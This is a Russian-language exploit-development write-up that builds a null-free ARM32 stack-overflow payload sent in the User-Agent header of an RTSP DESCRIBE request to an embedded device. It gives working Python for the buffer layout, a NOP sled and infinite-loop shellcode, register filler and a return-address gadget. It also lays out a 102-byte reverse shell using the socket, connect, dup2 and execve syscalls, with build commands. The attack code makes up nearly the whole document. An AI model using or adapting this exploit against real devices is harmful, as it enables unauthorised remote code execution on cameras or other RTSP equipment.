# Построение null-free ARM32 payload

---

## Ограничения

```
1. strcpy останавливается на 0x00 → весь payload должен быть null-free
2. ARM32 little-endian → адреса хранятся в LE (например 0x401234AC → \xAC\x34\x12\x40)
3. ua_buf = 102 байта → shellcode должен влезть
4. Адрес возврата (PC) = 4 байта, все ненулевые, 4-aligned
```

---

## Проверка адреса на null-free

```python
import struct

def is_null_free(addr: int) -> bool:
    return 0 not in struct.pack('<I', addr)

# Примеры:
# 0x401234AC → \xAC\x34\x12\x40 → OK ✓
# 0x40001234 → \x34\x12\x00\x40 → FAIL (байт 0x00 на позиции 2)
# 0x40F30000 → \x00\x00\xF3\x40 → FAIL (два нулевых байта)
```

---

## LOOP_SC — доказательство исполнения (102 байта)

```python
ARM_NOP  = b'\x01\x10\xa0\xe1'   # MOV R1, R1  — безопасная NOP инструкция
ARM_LOOP = b'\xfe\xff\xff\xea'   # B .          — бесконечный прыжок на себя

_nops   = (102 - 4 - 2) // 4    # = 24
LOOP_SC = ARM_NOP * 24 + ARM_LOOP + b'\x01\x01'

# Проверка:
assert len(LOOP_SC) == 102
assert 0 not in LOOP_SC
# b'\x01\x01' — два ненулевых байта выравнивания/padding
```

Почему `ARM_NOP = \x01\x10\xa0\xe1`?
- Декодируется как `MOV R1, R1` (no-op)
- LE = `0xe1a01001` — все байты ненулевые ✓
- `0xe1a01001 > 0xC0000000` — попадает в kernel-space (важно для FP cascade)

---

## Полный payload (252 байта)

```python
def make_payload(gadget_addr: int) -> bytes:
    """
    [0–101]   LOOP_SC       102 байта  ua_buf  null-free shellcode
    [102–215] b'B'×114      114 байт   locals  null-free filler
    [216–247] ARM_NOP×8      32 байта  R4–R11  kernel-space (быстрый crash)
    [248–251] gadget_addr     4 байта  PC      BX R0 адрес
    """
    assert 0 not in struct.pack('<I', gadget_addr)
    assert gadget_addr % 4 == 0

    locals_fill = b'\x42' * 114      # 'B' = 0x42, non-null
    reg_fill    = ARM_NOP * 8        # 0xe1a01001 × 8 = kernel space

    payload = LOOP_SC + locals_fill + reg_fill + struct.pack('<I', gadget_addr)
    assert len(payload) == 252
    assert 0 not in payload
    return payload
```

---

## Встраивание в RTSP запрос

```python
payload = make_payload(gadget_addr)
req = (b"DESCRIBE rtsp://█████████████:554/live RTSP/1.0\r\n"
       b"CSeq: 1\r\n"
       b"User-Agent: " + payload + b"\r\n\r\n")
```

`User-Agent` — текстовое поле по RFC, но RTSP-парсер устройства читает его как бинарный буфер (нет проверки на printable ASCII). Байты 0x01–0xFF проходят без фильтрации.

---

## Почему именно ARM_NOP для R4–R11?

```
Стек-лейаут:
  [216-219] → R4  = 0xe1a01001
  [220-223] → R5  = 0xe1a01001
  ...
  [244-247] → R11 = 0xe1a01001  ← frame pointer!

R11 (FP) = 0xe1a01001 > 0xC0000000 → kernel space
При crash ARM пытается unwind stack через FP:
  *FP → kernel address → page fault → немедленный kernel fault → crash за 2.5s ✓

Если R11 = user-space (например 0x43434343):
  *FP → возможно mapped memory → CPU ходит по chain... → 21 секунда → ложный DEAD ✗
```

---

## Shellcode под ua_buf (102 байта, null-free)

Для реального reverse shell (вместо LOOP):

```
Syscalls ARM Linux:
  socket  = 281   (SYS_socket)
  connect = 283   (SYS_connect)
  dup2    = 63    (SYS_dup2)
  execve  = 11    (SYS_execve)

Ограничения:
  - IP адрес не должен содержать 0x00 (e.g. 192.168.1.1 → OK, 10.0.0.1 → FAIL)
  - Port 4444 = 0x115C → OK, port 256 = 0x0100 → FAIL (null byte)
  - Строки ("/bin/sh\0") → \0 заменить: XOR с известным значением, вычесть 1 и т.д.

Инструмент сборки:
  arm-linux-gnueabi-as -o sc.o shellcode.s
  arm-linux-gnueabi-objcopy -O binary sc.o sc.bin
  python3 -c "d=open('sc.bin','rb').read(); assert 0 not in d; print(len(d),'bytes')"
```
